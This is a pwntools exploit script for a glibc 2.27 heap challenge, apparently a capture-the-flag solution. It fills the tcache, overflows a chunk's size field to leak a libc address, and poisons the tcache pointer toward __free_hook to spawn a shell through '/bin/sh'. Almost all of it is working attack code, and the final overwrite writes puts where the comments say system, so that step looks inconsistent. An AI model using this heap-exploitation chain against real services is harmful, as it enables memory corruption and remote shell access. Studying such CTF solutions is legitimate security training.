from pwn import *

context.log_level = 'debug'
libc = ELF("./libc-2.27.so")

sh = process(["./ld277-3ubuntu1.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
# sh = remote("8.134.97.12", 26756)


def create(size, content):
    sh.sendafter(">>> ", "opcode: 1\npasswd: Cr4at30\n\n")
    sh.sendafter(">>> ", str(size))
    sh.sendafter(">>> ", content)


def show(idx):
    sh.sendafter(">>> ", "opcode: 2\npasswd: SH0w0\n\n")
    sh.sendafter(">>> ", str(idx))
    return sh.recvuntil('\n', drop=True)


def edit(idx, content):
    sh.sendafter(">>> ", "opcode: 3\npasswd: Ed1t0\n\n")
    sh.sendafter(">>> ", str(idx))
    sh.sendafter(">>> ", content)


def delete(idx):
    sh.sendafter(">>> ", "opcode: 4\npasswd: D3l4te0\n\n")
    sh.sendafter(">>> ", str(idx))


for i in range(9):  # create 0~8
    create(520, 'A')  # malloc(528uLL) chunk size=544=0x220
for i in range(7):  # delete 8~2 # full tcache(0x220) size=7
    delete(8 - i)

delete(0)  # to unsorted bin chunk*1(0x220)
delete(0)  # unsorted bin chunk(0x220, 0x200)  0x200??? some chunk take 0x20???

create(520, 'A' * 520)  # malloc from tcache, tcache(0x220) size=6 # but unsorted bin, small bin change
# unsorted bin chunk*1(0x1e0)    small_bins[33]: chunk*1(size=0x220)

edit(0, 'A' * 0x238 + 'a' * 8)  # cover the size field of next chunk into 'a'*8
# small_bins[33]: fw=0x5555565bd230, bk=0x5555565bd230 Chunk(addr=0x5555565bd240, size=0x6161616161616160


leak_data = show(0)[0x240:]  # addr in libc
# idx=0 's next chunk in small bins, leak libc addr through small bins
libc.address = u64(leak_data.ljust(8, b'\x00')) + 0x00007f4fc852a000 - 0x7f4fc8915eb0
# - 0x00007f7c48fe9eb0 + 0x00007f7c48bfe000 -(leak addr)+(libc base addr in vmmap)
print(hex(libc.address))
# edit(0, b'A' * 0x238 + p64(0x221))
edit(0, (b'A' * 0x208).ljust(0x238, b'\x00') + p64(0x221))  # 520=0x208 # to chunk size=0x220

create(520, b"deadbeef".ljust(512, b'b'))  # tcache(0x220) size=5 # this chunk is in idx=0 now


delete(1)  # chunk with AAAAAAA
delete(0)  # chunk with deadbeefbbbbb


create(520, 'A' * 520)
# cover the fd field of the chunk in tcache into __free_hook
edit(0, (b'A' * 0x208).ljust(0x238, b'\x00') + p64(0x221) + p64(libc.symbols["__free_hook"]))
# tcache(0x220)-> chunk0 -> __free_hook
gdb.attach(sh)  # gdb

create(520, "/bin/sh\0")  # get chunk0 in tcache
create(520, p64(libc.symbols['puts']))  # system # modify __free_hook to system
delete(1)  # "/bin/sh\0" chunk'idx is 1 now # equal to call system("/bin/sh")

sh.interactive()
